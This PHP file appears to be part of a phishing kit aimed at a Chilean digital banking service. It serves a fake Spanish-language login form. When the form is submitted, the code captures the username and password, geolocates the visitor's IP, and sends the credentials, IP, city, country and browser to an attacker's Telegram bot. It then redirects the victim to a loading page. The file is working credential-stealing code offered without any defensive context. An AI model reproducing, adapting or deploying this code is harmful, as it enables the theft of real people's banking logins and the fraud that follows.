<?php
session_start();
error_reporting(0);
include "data.php";
$website = 'https://api.telegram.org/bot'.$token;
 
$ip = $_SERVER["REMOTE_ADDR"];
if (isset($_POST["user"]) && isset($_POST["pass"])) {
$_SESSION["user"] = $_POST["user"];
$type = $_POST["user"];
$code_a = $_POST["pass"];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ip_data_in = curl_exec($ch);
curl_close($ch);
$ip_data = json_decode($ip_data_in, true);
$country = $ip_data["country"];
$city = $ip_data["city"];
$isp = $ip_data["isp"];
$code = $ip_data["countryCode"];
echo $ip_data;
//$time = gmstrftime("%Y. %B %d. %A. %X %Z");
$agent = $_SERVER["HTTP_USER_AGENT"];
$ip = $_SERVER["REMOTE_ADDR"];
$browser = get_browser_name($_SERVER["HTTP_USER_AGENT"]);


$msg = "\n🤔User entered Password🤔\n🔑USER: => " . $type . "\n🔑PASS: => " . $code_a . "\n=============================  " . "\n🌎Browser: => " . $browser . "\n🌆 Country Code: " . $code . "\n🌐 Country: " . $country . "\n🌎 City: " . $city . "\n📍 IP: " . $ip . "\n=============================🔥\n🔥🔥\n🔥Telegram: xhub 🔥\n";
        

 $url = $GLOBALS['website'].'/sendMessage?chat_id='.$chat_id.'&parse_mode=HTML&text='.urlencode($msg);
        file_get_contents($url);

#echo '<script>window.location.href = "https://www.superdigital.cl/";</script>';
echo '<script>window.location.href = "mcargando.php";</script>';

    
}

function get_browser_name($user_agent)
{
if (strpos($user_agent, "Opera") || strpos($user_agent, "OPR/")) {
    return "Opera";
}
if (strpos($user_agent, "Edge")) {
    return "Edge";
}
if (strpos($user_agent, "Chrome")) {
    return "Chrome";
}
if (strpos($user_agent, "Safari")) {
    return "Safari";
}
if (strpos($user_agent, "Firefox")) {
    return "Firefox";
}
if (strpos($user_agent, "MSIE") || strpos($user_agent, "Trident/7")) {
    return "Internet Explorer";
}
return "Other";
}

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

<style type="text/css">
.con {position:relative;}
.logo {width:100%; margin-left:-18%;}
.desa {width:100%; margin-left:-25%}
.fo {width:100%; margin-top:60%; margin-left:-25%;}
.form {box-sizing:border-size;font-size:18px;color:green;position:absolute;top:16.5%;left:64%;
		background-color:white; width:30%; height:22%;}
input {margin-top:2%; width:50%;font-size:18px;}
button {margin-top:30%;margin-left:40%;font-size:14px;border:none;background-color:green;color:white;}



</style>

</head>

<body>
<div class="con" >
<div class="logo" ><img src="im/logoa.png" width="150%" height="10%"  ></div>

<div class="desa"><img src="im/logob.png" width="150%" height="30%" ></div>
<div class="fo"><img src="im/logoc.png" width="150%" height="10%"  ></div>

<div class="form">
<form  method="post" >
<label>Usuario:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</label>
<input name="user" type="text"  required="required" placeholder="" >
<br>
<label>Contraseña:</label>
<input name="pass" type="password"  required="required" placeholder="" >
<br>
<button type="submit" >SIGUIENTE</button>

</form>

</div>
</div>
</body>





</html>